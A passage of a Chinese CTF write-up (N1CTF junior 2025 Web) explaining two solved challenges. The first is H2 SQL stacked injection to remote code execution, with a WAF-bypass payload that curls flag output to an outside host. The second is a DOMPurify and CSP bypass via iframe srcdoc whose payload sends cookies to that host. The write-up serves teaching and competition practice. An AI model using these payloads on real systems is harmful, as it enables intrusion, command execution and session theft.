+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>    blackLists.add(<span class="hljs-string">&quot;runtime&quot;</span>);<br>    blackLists.add(<span class="hljs-string">&quot;process&quot;</span>);<br>    blackLists.add(<span class="hljs-string">&quot;exec&quot;</span>);<br>    blackLists.add(<span class="hljs-string">&quot;shell&quot;</span>);<br>    blackLists.add(<span class="hljs-string">&quot;file&quot;</span>);<br>    blackLists.add(<span class="hljs-string">&quot;script&quot;</span>);<br>    blackLists.add(<span class="hljs-string">&quot;groovy&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>H2允许用户定义<a target="_blank" rel="noopener" href="https://www.h2database.com/html/commands.html#create_alias">函数别名</a>，因此可以执行Java代码。简单的查询语句如下所示，该语句可以创建名为<code>REVERSE</code>的函数别名，其中包含我们构造的Java代码payload。然后我们可以使用<code>CALL</code>语句调用这个别名，执行我们的Java payload。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS REVERSE <span class="hljs-keyword">AS</span> <br>$$ String reverse(String s)&#123; <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> StringBuilder(s).reverse().toString();&#125;$$;<br><span class="hljs-keyword">CALL</span> REVERSE(<span class="hljs-string">&#x27;Test&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>为了实现远程代码执行（RCE），攻击者可以通过<code>java.lang.Runtime.exec()</code>来执行系统命令。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">CREATE ALIAS Infernity AS <br>$$ <span class="hljs-keyword">void</span> <span class="hljs-title function_">e</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> java.io.IOException <br>&#123;java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(cmd);&#125;$$<br>CALL <span class="hljs-title function_">Infernity</span><span class="hljs-params">(<span class="hljs-string">&#x27;whoami&#x27;</span>)</span>;<br></code></pre></td></tr></table></figure>
+
+<p>这里支持堆叠注入，直接 RCE，利用拼接绕过 WAF，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Run&quot;</span>+<span class="hljs-string">&quot;time&quot;</span>;<br>        Class&lt;?&gt; rt = Class.forName(<span class="hljs-string">&quot;java.lang.&quot;</span>+r);  <span class="hljs-comment">//拼接获取Runtime类</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">gr</span> <span class="hljs-operator">=</span> rt.getMethod(<span class="hljs-string">&quot;get&quot;</span>+r).invoke(<span class="hljs-literal">null</span>);  <span class="hljs-comment">//获取getRuntime对象</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> rt.getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,String.class);  <span class="hljs-comment">//获取exec方法</span><br>        ex.invoke(gr,<span class="hljs-string">&quot;calc&quot;</span>);   <span class="hljs-comment">//调用</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">password=123456&amp;username=admin&#x27;;CREATE ALIAS Infernity <span class="hljs-keyword">AS</span> <br>$$ void <span class="hljs-built_in">e</span>(String cmd) throws java.io.IOException <br>&#123;String r = <span class="hljs-string">&quot;Run&quot;</span>+<span class="hljs-string">&quot;time&quot;</span>;<span class="hljs-keyword">Class</span>&lt;?&gt; rt = <span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.&quot;</span>+r);Object <span class="hljs-keyword">gr</span> = rt.getMethod(<span class="hljs-string">&quot;get&quot;</span>+r).invoke(null);Method <span class="hljs-keyword">ex</span> = rt.getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,String.<span class="hljs-keyword">class</span>);<span class="hljs-keyword">ex</span>.invoke(<span class="hljs-keyword">gr</span>,cmd);&#125;$$<br>CALL Infernity(&#x27;curl http:<span class="hljs-comment">//rp1hua27.requestrepo.com?`/readflag`&#x27;);--</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="display"><a href="#display" class="headerlink" title="display"></a>display</h1><p>看index.js，这里给了一个预览页面，可以把base64加密后的payload get传参进来看看效果。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getQueryParam</span>(<span class="hljs-params">param</span>) &#123;<br>    <span class="hljs-keyword">const</span> urlParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>);<br>    <span class="hljs-keyword">return</span> urlParams.<span class="hljs-title function_">get</span>(param);<br>&#125;<br><br><span class="hljs-comment">// Sanitize content using DOMPurify</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sanitizeContent</span>(<span class="hljs-params">text</span>) &#123;<br>    <span class="hljs-comment">// Only allow &lt;h1&gt;, &lt;h2&gt;, tags and plain text</span><br>    <span class="hljs-keyword">const</span> config = &#123;<br>        <span class="hljs-attr">ALLOWED_TAGS</span>: [<span class="hljs-string">&#x27;h1&#x27;</span>, <span class="hljs-string">&#x27;h2&#x27;</span>]<br>    &#125;;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(text, config);<br>&#125;<br><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;DOMContentLoaded&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> textInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;text-input&#x27;</span>);<br>    <span class="hljs-keyword">const</span> insertButton = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;insert-btn&#x27;</span>);<br>    <span class="hljs-keyword">const</span> contentDisplay = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;content-display&#x27;</span>);<br><br>    <span class="hljs-keyword">const</span> queryText = <span class="hljs-title function_">getQueryParam</span>(<span class="hljs-string">&#x27;text&#x27;</span>);<br><br>    <span class="hljs-keyword">if</span> (queryText) &#123;<br>        <span class="hljs-keyword">const</span> sanitizedText = <span class="hljs-title function_">sanitizeContent</span>(<span class="hljs-title function_">atob</span>(<span class="hljs-built_in">decodeURI</span>(queryText)));<br><br>        <span class="hljs-keyword">if</span> (sanitizedText.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>            textInput.<span class="hljs-property">innerHTML</span> = sanitizedText;             <span class="hljs-comment">// 写入预览区</span><br>            contentDisplay.<span class="hljs-property">innerHTML</span> = textInput.<span class="hljs-property">innerText</span>;  <span class="hljs-comment">// 写入效果显示区</span><br><br>            insertButton.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>;    <br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            textInput.<span class="hljs-property">innerText</span> = <span class="hljs-string">&quot;Only allow h1, h2 tags and plain text&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>注意这里，利用了两次 <code>innerHTML</code></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">textInput.innerHTML</span> = sanitizedText<span class="hljs-comment">;             // 写入预览区</span><br><span class="hljs-attr">contentDisplay.innerHTML</span> = textInput.innerText<span class="hljs-comment">;  // 写入效果显示区</span><br></code></pre></td></tr></table></figure>
+
+<p>可以利用 <code>HTML</code> 实体编码绕过，又根据 hint：<strong>用iframe嵌入子页面可以重新唤起DOM解析器解析script标签</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>&lt;iframe&gt;</code>标签：这表示一个内嵌框架，它允许在当前页面中嵌入另一个 HTML 文档。<code>srcdoc</code> 属性允许直接将 HTML 内容作为字符串传递，而无需通过 URL 加载。</p>
+</blockquote>
+<p>还要注意app.js里的csp：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> csp = <span class="hljs-string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; base-uri &#x27;none&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>script-src &#39;self&#39;;</code><br>这一部分规定了脚本资源只能从当前页面的源（即同一域名）加载，禁止从其他域名加载脚本，防止恶意脚本注入。</li>
+<li><code>object-src &#39;none&#39;;</code><br>这一部分禁止加载任何对象资源（如 <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, <code>&lt;applet&gt;</code> 等标签的内容），增强页面安全性，防止恶意的插件或嵌入内容。</li>
+<li><code>base-uri &#39;none&#39;;</code><br>这一部分禁止页面设置 <code>&lt;base&gt;</code> 标签的 <code>href</code> 属性，避免通过修改页面基准URL来进行潜在的攻击。</li>
+</ul>
+<p>这里用 <code>404</code> 页面绕过，<code>script</code> 标签引入 <code>404</code> 页面执行 JS</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;text/plain&#x27;</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">decodeURI</span>(req.path)&#125;</span> : invalid path`</span>);<br>&#125;); <span class="hljs-comment">// 404 页面</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/N1CTF2025/image-20250213175436718.png" srcset="/img/loading.gif" lazyload alt="image-20250213175436718"></p>
+<p>总payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;lt;</span>iframe srcdoc=&quot;<span class="hljs-symbol">&amp;lt;</span>script src=.//%0Afetch(&#x27;http://rp1hua27.requestrepo.com&#x27;+document.cookie);//<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>&quot;<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;lt;</span>/iframe<span class="hljs-symbol">&amp;gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>base64加密后输入即可。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/WPs/" class="category-chain-item">WPs</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WPs/" class="print-no-link">#WPs</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>N1CTF junior 2025 Web wp</div>
+      <div>http://example.com/2025/02/12/N1CTF2025/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Infernity</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年2月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/02/16/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="fastjson原生反序列化">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">fastjson原生反序列化</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/08/VNCTF2025/" title="VNCTF2025 Web WP">
+                        <span class="hidden-mobile">VNCTF2025 Web WP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
